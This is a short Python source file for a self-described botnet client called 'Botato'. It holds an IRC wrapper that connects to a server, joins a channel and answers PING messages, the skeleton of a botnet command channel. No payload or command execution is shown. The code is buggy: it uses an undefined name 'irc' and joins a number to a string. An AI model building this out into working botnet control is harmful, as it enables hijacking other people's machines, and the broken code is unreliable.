''' Botato - A botnet client for native execution across supported networks for remote functionality.
	Copyright (C) 2014 EnKrypt
	Copyright (C) 2014 Jir0
	Copyright (C) 2014 Laneone

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation,either version 3 of the License,or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.

	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not,see <http://www.gnu.org/licenses/>.
'''

import socket

class IRC(object):
	'Wrapper for integrated communication over the IRC protocol'
	PONG="PONG"
	
	prefix="P"
	
	def __init__(self,host,port=6667,channel="botato"):
		self.host=host
		self.port=port
		self.channel="#"+channel
		self.sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.nowlistening=False
		
	def connect(self):
		print("Connecting to "+self.host+" on channel "+self.channel+" via port "+self.port)
		irc.connect((self.host, self.port))
		irc.send("USER "+IRC.prefix+"\"\" \"\" :Botato\r\n")
		irc.send("NICK "+IRC.prefix+"\r\n")
		irc.send("JOIN "+self.channel+"\r\n")
	
	def startlistening(self):
		self.nowlistening=True
		while 1:
			text=self.sock.recv(2040)
			print(text)
			if text.find('PING') != -1:
				self.sock.send('PONG ' + text.split() [1] + '\r\n')